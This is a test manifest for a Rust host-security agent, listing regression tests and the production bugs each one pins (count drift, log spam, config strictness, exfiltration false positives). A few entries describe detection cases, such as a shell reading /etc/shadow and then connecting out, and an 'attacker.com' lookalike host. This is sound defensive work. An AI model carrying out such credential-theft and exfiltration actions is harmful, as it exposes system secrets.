# Anchor Tests Manifest

This file is the **public** ledger of regression-anchor tests. Each entry pins one bug class so it cannot come back silently. Anchor tests differ from regular regression tests in two ways:

1. **They are named for the bug, not the function.** A test named `blocks_today_agrees_across_all_graph_derived_surfaces` is an anchor; a test named `test_count_unique_ips` is not.
2. **They are referenced from this file.** A CI gate (`scripts/verify-anchor-tests.sh`) asserts every entry below still exists in the source tree. Deleting or renaming an anchor without updating this file fails CI.

The operator's private `.claude-local/RECURRING_BUGS.md` cross-references entries here for the bugs that needed anchors.

## Format

`<test_module_path>::<test_name>` — one-line description of what the test pins.

## Anchors

### Operator-visible number consistency

- `crates/agent/src/dashboard/consistency_block_counts.rs::blocks_today_agrees_across_all_graph_derived_surfaces` — "Blocks today" agrees across dashboard live feed, top bar, site live feed, and the shared graph helper. Pinned the 2026-04-11 / 2026-04-22 dashboard-vs-site count drift.

- `crates/agent/src/response_lifecycle.rs::tests::current_orphan_count_returns_zero_on_clean_system` — `current_orphan_count()` returns the number of real orphan entries on disk, never the lifetime counter. Pinned the 2026-05-03 banner gaslighting bug ("17 orphaned" persisting after PR #408 GC pruned the entries).

- `crates/agent/src/response_lifecycle.rs::tests::to_json_exposes_gauges_shape_distinct_from_totals` — JSON output keeps `gauges.*` (current state) separate from `totals.*` (lifetime counters). Anti-regression for collapsing them back into one field.

- `crates/agent/src/dashboard/mod.rs::tests::js_responses_banner_reads_gauges_not_totals` — frontend banner reads `r.gauges?.orphaned`, drift trigger does not key off the lifetime counter, banner copy says "currently pending" so the operator reads it as present-tense gauge.

### Knowledge graph correctness

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::ingest_clears_current_event_metadata_after_run` — `_current_event_*` fields are cleared at the end of every `ingest()` call. Pinned the 2026-05-03 cross-attribution bug (agent self-traffic appearing under attacker IP journey).

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::add_edge_outside_ingest_does_not_inherit_stale_summary` — edges created outside an ingest cycle do not inherit the previous event's summary as a stale property.

### Memory budget

- `crates/agent/src/loops/boot.rs::heap_budget::run_agent_once_allocates_under_budget` — boot path stays under 500MB peak alloc.
- `crates/agent/src/knowledge_graph/persistence.rs::heap_budget::save_to_store_allocates_under_budget` — KG snapshot save stays under 5MB per call.
- `crates/agent/src/loops/slow_loop.rs::heap_budget::process_narrative_tick_allocates_under_budget` — slow-loop tick stays under 10MB.

### Dashboard UX consistency

- `crates/agent/src/dashboard/mod.rs::tests::js_intel_baseline_tab_is_english_not_pt_br` — Baseline tab strings are English. Anti-regression for PT-BR copy reintroduction.

### Baseline UX honesty

- `crates/agent/src/dashboard/mod.rs::tests::js_login_heatmap_hides_service_accounts_by_default` — the "Who logs in, when" heatmap default-hides daemon PAM sessions (snap_daemon, systemd-resolve, messagebus, _apt, ...) and exposes a "Show system accounts" toggle. Pinned the 2026-05-03 visual report where the operator read the heatmap as "all these people have logged in" when only `ubuntu` had real SSH sessions.

- `crates/agent/src/dashboard/intelligence.rs::baseline_enrich_tests::build_user_classes_marks_daemon_sessions_as_service` — the `/api/baseline-status` endpoint enriches the JSON with a `user_classes` map keyed by username. snap_daemon (uid 584788, /usr/bin/false) classifies as `service`, ubuntu (uid 1000, /bin/bash) as `human`, root as `root`, and unknown users fall through to `unknown` so the operator still sees them. Anti-regression for the classification contract that the frontend keys off.

### Baseline learning honesty (Wave 5b)

- `crates/agent/src/baseline.rs::tests::is_valid_unix_username_rejects_brute_force_and_garbage` — `is_valid_unix_username` rejects `Admin`, `AdminGPON`, `1234`, `123456789`, `!`, `(`, `*` and other shapes observed in the operator's polluted prod baseline on 2026-05-03. Anti-regression for any change that loosens the regex to allow uppercase, leading digits, or special chars.

- `crates/agent/src/baseline.rs::tests::observe_event_skips_honeypot_source_logins` — events with `source` starting `honeypot` never write to `user_login_hours`. Pinned because the agent's honeypot accepts every credential to fool attackers; if the session log is wired into the event pipeline (now or later), baseline must not record those usernames.

- `crates/agent/src/baseline.rs::tests::observe_event_skips_invalid_usernames` — even from non-honeypot sources, entity values that fail `is_valid_unix_username` are not written. This is the actual operator-hit case: a third-party sshd or PAM module emitted `ssh.login_success` for `AdminGPON` and baseline recorded it.

- `crates/agent/src/baseline.rs::tests::prune_invalid_users_cleans_pre_wave5b_pollution` — `prune_invalid_users()` removes existing pollution from on-disk baseline.json. The boot path calls it once at load so existing prod hosts get cleaned on the next agent restart.

### XDP availability gate (Wave 5b PR-2)

- `crates/agent/src/xdp_availability.rs::tests::xdp_availability_gate_skips_attempts_and_rate_limits_warns` — `should_attempt_xdp()` skips XDP attempts for `RECHECK_INTERVAL_SECS` (5 min) after a failure, AND `mark_failed()` rate-limits the operator-facing WARN to one per window. Pinned the 2026-05-03 prod log-spam where bpffs was unmounted and the agent emitted two WARN lines per block decision (3+ blocks/hour) plus a wasted bpftool subprocess each time.

### SQLite backfill contention (Wave 5b PR-3)

- `crates/agent/src/loops/slow_loop.rs::tests::backfill_throttle_allows_one_per_minute_then_blocks` — the src_ip backfill runs at most once per minute even though slow_loop ticks every 30 s. Pinned the 2026-05-03 prod log spam where the backfill raced the sensor's concurrent SQLite writer (separate process, same .db file) for the writer lock every 30 s and lost. Combined with `BACKFILL_BATCH_SIZE: usize = 100` (was 1000) and the lock-error retry-with-backoff in `drive_events_src_ip_backfill`, prod hosts now make forward progress without log spam.

### KG correctness (Wave 5b PR-4)

- `crates/agent/src/knowledge_graph/persistence.rs::tests::snapshot_after_node_eviction_carries_no_dangling_edges` — pre-save compaction (`compact_edges_force`) must remove tombstoned edges so the persisted blob never carries dangling references. Pinned the 2026-05-03 prod WARN spam `Knowledge graph has dangling edge references — pruning dangling=30157` that fired every save cycle for days.

- `crates/agent/src/knowledge_graph/detectors.rs::tests::discovery_burst_severity_caps_at_medium_for_service_users` — the `graph_discovery_burst` detector caps severity at Medium for Service-class users. Pinned the 2026-05-03 operator-visible bug where `snap_daemon` (uid 584788) doing 92 actions in 60s during a routine snap refresh fired a HIGH-severity red-banner alert on the site home as if the server were compromised.

### Live-feed JSONL fallback (Wave 5c PR-5)

- `crates/agent/src/dashboard/live_feed.rs::tests::jsonl_fallback_recovers_count_when_kg_is_empty` — when the in-memory KG is empty (TTL evicted everything) but `incidents-{date}.jsonl` on disk has entries, `merge_incidents_prefer_kg` surfaces every JSONL entry. Pinned the 2026-05-03 site-vs-dashboard discrepancy where the public live feed reported "4 events / 0 blocks (24h)" while prod JSONL had 42 incidents and 647 block decisions. Anti-regression for any refactor that drops the JSONL read or short-circuits when the KG is empty.

- `crates/agent/src/dashboard/live_feed.rs::tests::merge_incidents_prefers_kg_and_dedups_by_incident_id` — the merge prefers KG-side entries (richer entity context) and dedupes by `incident_id` so neither tier double-counts. Pinned the contract that frontend numbers reflect the count of distinct incidents, not the sum of two stores.

- `crates/agent/src/dashboard/live_feed.rs::tests::load_jsonl_incidents_returns_empty_on_missing_file` — the JSONL loader returns an empty vec on missing/unreadable files so a degraded-IO state never crashes the public live-feed endpoint.

### GeoIP cache + live-feed sources (Wave 6a)

- `crates/agent/src/geo_cache.rs::tests::entry_expires_exactly_at_ttl_boundary` — `GeoEntry::is_expired` honours the 7-day TTL boundary exactly. Anti-regression for any change that bumps the TTL silently and inflates the ip-api rate-budget consumption.

- `crates/agent/src/geo_cache.rs::tests::get_fresh_distinguishes_hit_miss_and_stale` — `GeoCache::get_fresh` returns Some(entry) only when the entry exists AND is within the TTL. Pinned the contract that the public site map depends on: a hit avoids ip-api, a miss/stale falls through to the network. A regression that "always returns Some" would silently serve stale geo; "never returns Some" would re-DDOS ip-api on every page load.

- `crates/agent/src/dashboard/live_feed.rs::tests::live_feed_sources_carry_geo_from_disk_cache` — `/api/live-feed` carries a `sources` array with country/lat/lon already attached for every IP found in `geo-cache.json`. Pinned the operator-visible bug shape "site map shows 4 dots while there are 138 attackers" — without pre-attached geo the frontend would need 138 round-trips to ip-api (rate-limited at 45/min = 3+ minutes of cold start).

### Autoencoder anchor recalibration (Wave 7a)

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_replaces_anchors_with_fresh_distribution` — `recalibrate_anchors_from_events` rebuilds `baseline_percentile_anchors` from a fresh batch of events without touching the network weights, and the new anchors are sorted ascending. Pinned the 2026-05-04 prod symptom where every observe() returned `score="1.000"` because stale training-time anchors did not represent current event distribution; spec-033 tanh extrapolation saturated near 1.0; +9.9% boost in `incident_decision_eval` fired as a constant offset (zero discriminative value).

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_refuses_short_input_keeps_old_anchors` — refuses to act when fewer than `BASELINE_PERCENTILES` (101) full-window MSE samples can be collected, and leaves existing anchors untouched. Anti-regression for a future change that silently writes degenerate (under-sampled) anchors.

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_persisted_state_round_trips_via_disk` — recalibrated state survives the `anomaly-model.bin` save → reload cycle. `training_cycles` is preserved exactly via the synthesised `total_samples = cycles * 100_000` field that the v2 file format expects. Anti-regression for any change that breaks the binary layout match between `persist_model_state` and `parse_model_file`.

- `crates/agent/src/neural_lifecycle.rs::tests::persist_after_recal_preserves_loaded_total_samples_exactly` — when the engine was loaded from a model file with `total_samples` not a multiple of 100_000 (e.g. 499_999), a recalibration save preserves the original value rather than re-deriving from `cycles * 100_000`. Pre-fix the synthesis would have truncated 499_999 → 400_000 and silently dropped maturity from ~1.0 to ~0.8. (Copilot #2 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::persist_pads_anchor_table_to_exact_layout_size` — `persist_model_state` writes exactly `BASELINE_PERCENTILES * 4` anchor bytes, padding with 0.0 if the in-memory vec ever shrinks below the constant. Pre-fix a short vec would emit a truncated v2 layout that the loader would reject on the next restart. (Copilot #3 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::persist_keeps_previous_model_as_dot_prev_backup` — write order is "tmp first, durable, then rotate previous to .prev, then atomic rename onto target". Pre-fix the rotate-then-write order created a window where a tmp-write failure left zero usable model files. (Copilot #1 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::train_nightly_post_recal_skips_when_no_graph_features` — the post-train recalibration block in `train_nightly_with_store` is gated on `Some(graph_features)`; without graph features the recalibration is skipped so test fixtures and pre-graph boots do not get a recalibration that would overwrite anchors with a degraded no-graph distribution. Pinned the operator-observed bug where the 2026-05-04 nightly retrain wiped Wave 7a's boot recalibration and prod returned to 100% saturation by morning.

### CLI module/capability surface (Wave 7b)

- `crates/ctl/src/scan.rs::tests::module_ids_use_module_install_not_enable` — every `enable_hint` on a `ModuleRec` and every step of `activation_sequence()` that starts with `innerwarden enable <id>` must use a real capability id (`block-ip`, `sudo-protection`, `shell-audit`, `ai`); module ids must use `innerwarden module install <id>`. Pinned the 2026-05-04 operator-hit bug where `innerwarden scan` printed `→ innerwarden enable container-security` and the operator running it got `unknown capability 'container-security'` because container-security is a module, not a capability.

- `crates/ctl/src/main.rs::tests::known_module_id_recognises_registry_modules` — `known_module_id` recognises module ids declared in the workspace `registry.toml` (`openclaw-protection`, `cloudflare-integration`, etc.) regardless of the file's whitespace formatting. Anti-regression for the brittle 10-space substring scan the helper replaced.

- `crates/ctl/src/main.rs::tests::known_module_id_rejects_capabilities_and_typos` — capability ids (`block-ip`, `shell-audit`) and partial-match typos (`openclaw`, `ssh-protect`) do NOT classify as modules, so the suggestion path is not triggered for the wrong surfaces.

- `crates/ctl/src/main.rs::tests::unknown_cap_error_suggests_module_install_for_modules` — when the operator runs `enable <name>` and `<name>` matches a module id from the registry, the error message contains `module install <name>` so they have a one-paste path to recovery instead of grepping `innerwarden list`.

- `crates/ctl/src/main.rs::tests::unknown_cap_error_falls_back_for_typos` — when `<name>` is not a known module id, the error is the generic "unknown capability" line. Anti-regression for accidentally suggesting `module install` for typos like `enable bllock-ip`, which would dead-end the operator on the wrong surface.

### Correlation engine — package-manager false-positive suppression (Wave 8a)

- `crates/agent/src/correlation_engine.rs::tests::cl008_does_not_match_when_originating_process_is_a_package_manager` — CL-008 (Data Exfiltration via eBPF Sequence) refuses to match when `event.details.comm` is a package manager (apt-get reading /etc/apt/sources.list + connecting to archive.ubuntu.com). Pinned the 2026-05-04 prod incident where CL-008 fired 32 critical chains in one day and auto-blocked Ubuntu archive mirrors (91.189.91.46), GitHub Pages CDN (185.199.108-111.153), Telegram (149.154.166.110 — the agent's own notification infra) and Oracle Cloud (147.154/16) via UFW with `dry_run=false`.

- `crates/agent/src/correlation_engine.rs::tests::cl008_still_matches_for_non_package_manager_processes` — same shape as above but `comm = "bash"` reading /etc/shadow + connecting to a random IP — chain MUST still fire. The suppression list is a tight allowlist, not a hole that disables the chain entirely.

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppression_handles_15char_truncated_comms` — Linux truncates `comm` at TASK_COMM_LEN-1 = 15 chars, so `unattended-upgrade` arrives as `unattended-upgr`, `dpkg-statoverride` as `dpkg-statoverri`, etc. The suppression list MUST contain the truncated forms or the bug returns silently for any host running unattended-upgrades (the Ubuntu default — including the prod host that hit this on 2026-05-04).

- `crates/agent/src/correlation_engine.rs::tests::comm_suppression_does_not_leak_to_other_rules` — only CL-008 opts into package-manager suppression today. Other rules with the same kind patterns must still fire; suppression is keyed by `rule_id`, not global. Anti-regression for accidentally lifting the per-rule gate (would silently disable many chains).

- `crates/agent/src/correlation_engine.rs::tests::cl008_no_comm_field_does_not_panic_and_falls_through` — older sensors (or non-eBPF event sources) emit `file.read_access` without a `comm` field. `event_comm_is_suppressed` returns false in that case (event proceeds to normal kind/entity matching) instead of panicking on the missing JSON key.

### Allowlist audit trail (Wave 8e)

- `crates/ctl/src/commands/response.rs::tests::cmd_allowlist_add_with_reason_persists_reason_in_admin_audit` — `innerwarden allowlist add --ip <cidr> --reason "<text>"` writes the verbatim reason into the daily `admin-actions-YYYY-MM-DD.jsonl`. Pinned the 2026-05-04 operator pain: 4 emergency CIDRs (Ubuntu mirrors, Telegram, GitHub Pages, Oracle Cloud) were added during a CL-008 mitigation with no flag to record WHY, so a future operator looking at the allowlist had no way to tell if the entries were still load-bearing or stale.

- `crates/ctl/src/commands/response.rs::tests::cmd_allowlist_add_without_reason_records_null_reason_in_audit` — `--reason` is OPTIONAL for backwards compat with existing operator scripts, but omitting it MUST surface as `"reason":null` in the audit log so future-operator tooling can grep for entries with no recorded WHY. Anti-regression for silently accepting reason-less adds (the original 2026-05-04 bug shape).

### Config file permission fix (Wave 8d)

- `crates/agent/src/config.rs::tests::perm_fix_command_does_chown_before_chmod` — the operator-facing fix command for over-permissive `agent.toml` MUST do `chown innerwarden:innerwarden` BEFORE `chmod 600`. Pinned because the previous WARN ("consider chmod 600") led the operator straight into a broken-restart trap on 2026-05-04: chmod 600 on a root-owned file with the agent running as a non-root service user makes the config unreadable on the next start. Reversing the order in this string is the bug we are guarding against.

- `crates/agent/src/config.rs::tests::perm_fix_command_handles_paths_without_shell_injection` — the path is operator-controlled (passed via `--config`), so the fix-suggestion string must not contain backticks, `$()`, or extra `&&` chains beyond the one we put there. Anti-regression for accidentally interpolating shell metacharacters into a copy-pasteable command.

### Config schema strictness (Wave 9e — silent-TOML-drift gate)

- `crates/agent/src/config.rs::tests::data_retention_alias_resolves_to_data_section` — operators with the legacy `[data_retention]` section name keep working: the `#[serde(alias = "data_retention")]` on `AgentConfig::data` resolves the section into `cfg.data` so `filestore_max_size_mb`, `events_keep_days`, and the rest are actually applied. Pinned the 2026-05-04 audit AUDIT-002: prod's `[data_retention] filestore_max_size_mb = 1024` had been a silent no-op because the section name did not match the field; removing the alias would brick every existing prod config on the next deploy.

- `crates/agent/src/config.rs::tests::data_section_canonical_name_works_too` — the canonical `[data]` section name (which matches the `pub data` field) parses as expected. Pairs with the alias test so future readers see both forms exercised in the same module.

- `crates/agent/src/config.rs::tests::unknown_top_level_section_fails_loudly` — `#[serde(deny_unknown_fields)]` on `AgentConfig` rejects sections like `[bogus_section]` with a clear error. Anchor against accidentally lifting the deny gate, which would re-introduce the AUDIT-002 silent-drift class for top-level sections.

- `crates/agent/src/config.rs::tests::unknown_inner_key_fails_loudly_in_data_section` — the strict gate also fires on inner-key typos like `keep_dayss` under `[data]`. This is the EXACT failure shape AUDIT-002 surfaced (prod's `[data_retention] keep_days = 7` was using a key that does not exist on `DataRetentionConfig`).

- `crates/agent/src/config.rs::tests::legacy_data_retention_with_unknown_inner_key_also_fails_loudly` — the alias does NOT bypass the inner-struct strictness. A legacy `[data_retention]` block with bogus keys still hard-fails, so operators get told about each typo on the deploy that matters and can fix them in one go.

- `crates/agent/src/config.rs::tests::empty_config_uses_defaults_cleanly` — an empty TOML still deserialises to `AgentConfig::default()`. Anti-regression for adding `deny_unknown_fields` somewhere that breaks Default.

- `crates/agent/src/config.rs::tests::every_top_level_section_is_documented_with_an_inner_struct` — locks the canonical set of top-level sections. Adding a new section is fine; renaming or removing one fails this test, forcing the contributor to either pair the rename with a `serde(alias)` (back-compat for existing prod agent.toml files) or document the breaking change.

### Sensor log discipline (Wave 9f — AUDIT-010 anchor)

- `crates/sensor/src/collectors/log_state.rs::tests::first_failure_warns_subsequent_identical_failures_are_quiet` — `OpenLogState` emits exactly one `WarnNewFailure` for the first failure in a state and `Quiet` on every subsequent retry with the same error. Pinned the 2026-05-04 prod log spam where `nginx_access` and `nginx_error` collectors emitted **728 WARN entries in 30 minutes** while retrying a missing log file every 5 s — one WARN per attempt instead of one WARN per failure episode. Pre-fix the same scenario produced ~720 WARN/h; post-fix it produces 1.

- `crates/sensor/src/collectors/log_state.rs::tests::recovery_after_failure_emits_info_and_resets` — when an open succeeds after a failure, `observe_open` returns `InfoRecovered` (logged at INFO by the collector). Pairs with the WARN the operator saw earlier; closes the loop on the failure episode.

- `crates/sensor/src/collectors/log_state.rs::tests::different_error_after_first_failure_warns_again` — ENOENT followed by EACCES re-WARNs because the failure shape changed. Anti-regression for a "remember every error we ever saw and never WARN again" simplification that would silence the second failure class.

- `crates/sensor/src/collectors/log_state.rs::tests::flapping_failure_recovery_failure_re_warns_each_failure_episode` — drop-in / drop-out / drop-in cycles produce one WARN per failure episode + one INFO per recovery. Anti-regression for cumulative-state designs that would silence the second episode.

- `crates/sensor/src/collectors/log_state.rs::tests::long_run_steady_failure_emits_one_warn_total` — end-to-end count: 720 retries against a persistent failure produces exactly 1 WARN (vs 720 pre-fix). The headline anchor for the AUDIT-010 reproduction case.

- `crates/sensor/src/collectors/log_state.rs::tests::classify_open_repeat_failure_returns_retry_quiet` — `classify_open` returns `Retry { verdict: Quiet }` for repeated identical failures, so the collector's match arm leads to a debug log, never a WARN. Anti-regression for accidentally re-emitting WARN on every retry through the high-level helper.

- `crates/sensor/src/collectors/log_state.rs::tests::classify_open_recovery_returns_proceed_info_recovered` — the success-after-failure path produces `Proceed { verdict: Some(InfoRecovered) }`, so the collector knows to log the recovery INFO line and resume the read loop.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_quiet_is_debug_suppressed` - `log_instruction_for(Retry { Quiet })` returns `DebugSuppressed`. Anti-regression for collapsing the suppressed-retry branch back to `WarnCannotOpen`, which would resurrect the AUDIT-010 prod log flood (~720 WARN/h on a missing nginx log).

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_first_failure_is_warn` - `log_instruction_for(Retry { WarnNewFailure })` returns `WarnCannotOpen`. Pins that the FIRST observation of a failure stays at WARN (operator visibility) regardless of how the per-verdict mapping is rewritten.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_end_to_end_through_classify_open` - exercises the full `state -> classify_open -> log_instruction_for` chain across 100 retries: 1 WARN, 100 DEBUGs, 1 INFO recovery. End-to-end shape that documents the contract three layers care about.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_recovered_falls_back_to_debug_in_release` - defensive: if a future verdict variant ever ends up on a `Retry { InfoRecovered }` path (contract drift), the helper returns the QUIETEST level, not WARN. `debug_assert!` still fires in debug builds; release builds degrade to `DebugSuppressed`.

- `crates/sensor/src/collectors/nginx_access.rs::tests::run_emits_event_for_existing_log_line` - exercises the `Ok` arm of `match open_result` end-to-end: tempfile with one valid combined-log-format line, the collector parses it and emits an `http.request` event. Anchors that the Wave 9f refactor (extracting `log_instruction_for`) did not break the happy path.

- `crates/sensor/src/collectors/nginx_access.rs::tests::run_retries_quietly_on_persistent_missing_file` - exercises the `Err` arm under paused tokio time so the 5-second retry sleep is virtual. Anchors that the collector survives a missing file across multiple iterations without panicking. Pairs with the unit tests on `log_instruction_for` for the verdict-to-level mapping.

- `crates/sensor/src/collectors/nginx_error.rs::tests::run_emits_event_for_existing_error_line` - same `Ok`-arm anchor as nginx_access, on the error log collector. Tempfile with a `[error]` line carrying a client IP must produce one `http.error` event.

- `crates/sensor/src/collectors/nginx_error.rs::tests::run_retries_quietly_on_persistent_missing_file` - same `Err`-arm anchor as nginx_access, on the error log collector.

### Tracing journald priority (Wave 9f - AUDIT-009 root)

- `crates/agent/src/tests::use_journald_layer_returns_true_when_journal_stream_is_set` - `use_journald_layer` returns true iff the binary is being captured by systemd's journal stream (detected via the `JOURNAL_STREAM=<dev>:<inode>` env var). Pinned the 2026-05-04 audit AUDIT-009: pre-fix `journalctl -p warning` silently dropped every WARN this crate emitted because `tracing-subscriber`'s fmt layer wrote plain text to stdout with no `PRIORITY=` field. Wave 9f routes tracing through `tracing-journald` when this returns true, which sets PRIORITY based on the tracing level via `sd_journal_send`.

- `crates/agent/src/tests::use_journald_layer_returns_false_when_env_is_unset` — off-systemd dev shell + macOS dev: env var absent, `use_journald_layer` returns false so the binary does NOT try to write to a non-existent journal socket (would fail at startup on macOS where there is no `/run/systemd`).

- `crates/agent/src/tests::use_journald_layer_returns_false_when_env_is_empty_string` — defensive: `JOURNAL_STREAM=` (empty) is treated as unset. Anti-regression for an operator's foreground run silently attempting a journald write that fails.

- `crates/agent/src/tests::build_tracing_env_filter_includes_innerwarden_directives` — the env filter MUST enable both `innerwarden_agent` (the actual code) and `telegram_audit` + `innerwarden_store` (sub-namespaces previous PRs explicitly opted into — PR #357 and the audit-ui spec). Dropping any of these silently turns off operator-visible logs for the affected subsystem.

- `crates/sensor/src/main.rs::tests::use_journald_layer_returns_true_when_journal_stream_is_set` — same contract on the sensor side.

- `crates/sensor/src/main.rs::tests::use_journald_layer_returns_false_when_env_is_unset` — same defensive case for sensor.

- `crates/sensor/src/main.rs::tests::use_journald_layer_returns_false_when_env_is_empty_string` — same empty-env defensive case for sensor.

- `crates/sensor/src/main.rs::tests::build_tracing_env_filter_includes_innerwarden_sensor_directive` — the sensor's env filter MUST enable the `innerwarden_sensor` namespace; dropping it silently turns off most logs.

### Cloudflare CIDR validation (Wave 9g — AUDIT-017 anchor)

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_bare_ipv4` — bare IPv4 / IPv6 addresses (no prefix) pass the validator. Cloudflare's IP Access Rules API treats them as host-targeted blocks; the validator must not require a prefix.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_documented_ipv4_widths` — only `/16`, `/24`, `/32` are accepted for IPv4 per Cloudflare docs. Anchor against accidentally adding /20 / /28 / etc to the allowlist (would re-introduce AUDIT-017 silent failures).

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_undocumented_ipv4_widths` — pins the EXACT prod failure shape from 2026-05-04: `/22`, `/8`, `/12`, `/20`, `/27`, `/0` all rejected. Pre-fix these wasted an HTTP round trip and got `firewallaccessrules.api.validation_error: invalid ip provided`. Post-fix they short-circuit at the agent boundary.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_accepts_documented_ipv6_widths` — IPv6 supports `/32`, `/48`, `/64` per Cloudflare. Distinct rules from IPv4; pin them.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_undocumented_ipv6_widths` — `/128` (single IPv6) is technically a CIDR but Cloudflare expects bare IPv6 for hosts; reject `/128` so callers use the bare form. Also rejects `/16`, `/24`, `/56` (valid for IPv4 but not IPv6) — the validator must keep the family rules separate.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_rejects_garbage_input` — defensive: empty, whitespace, non-IP, broken CIDR, missing prefix, missing host all rejected. Anti-regression for accidentally allowing `parse::<IpAddr>` on a partial string.

- `crates/agent/src/cloudflare.rs::tests::cloudflare_target_is_valid_trims_surrounding_whitespace` — operator config / CLI often emits stray whitespace; trim before validating so a copy-pasted IP with a trailing newline does not get rejected as malformed.

### Local classifier safety net (Wave 9g — AUDIT-016 anchor)

- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_without_ip_entity_is_downgraded_to_ignore` — when the classifier predicts `block_ip` but the incident has no IP entity, the resulting action MUST be `Ignore` (NOT `BlockIp`). Pinned the 2026-05-04 audit AUDIT-016 finding: the safety-net downgrade is intended behaviour, not an operator-actionable WARN. Removing the downgrade would let the classifier produce a structurally invalid `BlockIp` action with no IP target.

- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_with_ip_entity_produces_block_ip` — when the IP IS present, the action MUST be `BlockIp`. Anti-regression for over-eagerly downgrading.

- `crates/agent/src/ai/local_classifier.rs::tests::monitor_without_ip_uses_unknown_placeholder` — documents the existing fallback for `monitor` predictions without an IP (uses `"unknown"`); future contributors cannot drop the unwrap_or without changing the public action shape.

- `crates/agent/src/ai/local_classifier.rs::tests::unknown_action_name_falls_back_to_ignore` — if a future model adds a label we don't recognise, the agent MUST fall back to `Ignore` (no panic, no partial decision). Confidence stays in the reason string for audit visibility.

- `crates/agent/src/ai/local_classifier.rs::tests::dismiss_includes_confidence_in_reason_string` — audit-trail anchor: the reason for a `Dismiss` action must include the confidence so the operator can grep `dismiss (confidence 0.` for low-confidence dismisses without re-querying the inference batch.

### Supervisor HTTPS health probe (PR α - AUDIT-005 anchor)

- `crates/supervisor/src/health.rs::tests::loopback_https_url_triggers_skip_verify` - constructing a `HealthChecker` with `https://127.0.0.1:8787` sets `skip_tls_verify=true` so the probe accepts a self-signed cert. Pinned the 2026-05-04 prod incident where the watchdog probed `http://127.0.0.1:8787` against an HTTPS-serving agent and accumulated 1100+ consecutive failures over ~10 hours, SIGKILLing a healthy agent every 30 s.

- `crates/supervisor/src/health.rs::tests::loopback_https_localhost_triggers_skip_verify` - same anchor with `localhost` host; defensive against an operator-supplied URL that does not literally use the IP.

- `crates/supervisor/src/health.rs::tests::loopback_https_ipv6_triggers_skip_verify` - IPv6 loopback `[::1]` is also recognised as loopback. Anti-regression for an IPv4-only matcher that would silently demote IPv6-host watchdog deployments.

- `crates/supervisor/src/health.rs::tests::http_loopback_does_not_skip_verify` - plain HTTP keeps `skip_tls_verify=false`. Anti-regression for accidentally widening the skip path to plain HTTP, which is a pointless toggle and might mask other config errors.

- `crates/supervisor/src/health.rs::tests::non_loopback_https_keeps_verify_on` - HTTPS to a non-loopback host (`10.0.0.5`, `example.com`) keeps verification ON. Anti-regression for "auto-disable on every HTTPS" which would erase the cert protection on a remote watchdog probe.

- `crates/supervisor/src/health.rs::tests::url_is_loopback_https_handles_path_and_userinfo` - URL parsing tolerates `userinfo@`, query strings, and `/path` suffixes without losing the host comparison.

- `crates/supervisor/src/health.rs::tests::url_is_loopback_https_rejects_lookalike_hosts` - the matcher uses exact host equality, NOT prefix or substring match. Anti-regression for a future "starts_with" shortcut that would let an attacker-controlled `127.0.0.1.attacker.com` skip TLS verification.

### Agent /livez liveness endpoint (PR α2 - AUDIT-005 follow-up anchor)

- `crates/agent/src/dashboard/mod.rs::tests::js_livez_endpoint_is_unauthenticated` - the `/livez` route returns 200 OK without Basic Auth, regardless of whether the dashboard is bound to loopback or non-loopback. Pinned the AUDIT-005 follow-up: the supervisor's health probe got 401 from `/metrics` even after the HTTPS fix because every agent endpoint required auth on non-loopback bind. `/livez` is the contract that splits "process alive" from "operator can read counters".

- `crates/agent/src/dashboard/mod.rs::tests::js_livez_endpoint_returns_constant_body` - the body is exactly `ok\n` with no JSON, no state, no per-host info. Anti-regression for accidentally turning `/livez` into a verbose status page that leaks deployment details to unauthenticated probes.

- `crates/supervisor/src/health.rs::tests::probe_path_is_livez_not_metrics` - the supervisor probes `<agent_api>/livez`, NOT `/metrics`. Anti-regression for a "let's reuse /metrics" simplification that would re-introduce the AUDIT-005 401 false-alarm against any non-loopback bind.

### CL-008 self-traffic suppression (PR ε - AUDIT-CL008-SELF anchor)

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppressed_when_originating_comm_is_innerwarden_agent` - eBPF events with `comm = innerwarden-age` (the truncated form the kernel actually emits for `innerwarden-agent`) are dropped from CL-008 chain matching. Pinned the 2026-05-04 prod incident where the agent's outbound to AbuseIPDB / threat feeds / Telegram was being correlated as Data Exfiltration and blocked via UFW.

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppressed_when_originating_comm_is_tokio_rt_worker` - eBPF events with `comm = tokio-rt-worker` are dropped. The agent's HTTP / Redis / DNS calls all run on these threads; without this carve-out every outbound call from the agent triggered CL-008.

- `crates/agent/src/correlation_engine.rs::tests::innerwarden_binary_self_traffic_suppression_is_rule_agnostic` - the InnerWarden binary-name carve-out (`innerwarden-age` etc.) applies to EVERY rule. Anti-regression for accidentally scoping the new list to CL-008 only via `rule_comm_suppressions`.

- `crates/agent/src/correlation_engine.rs::tests::tokio_rt_worker_only_suppressed_on_cl008_not_other_rules` - the `tokio-rt-worker` carve-out is CL-008-specific. Anti-regression for promoting `tokio-rt-worker` to `INNERWARDEN_SELF_COMMS`, which would create a workspace-wide blind spot for any Tokio-based malware (the thread name is generic, not InnerWarden-specific).

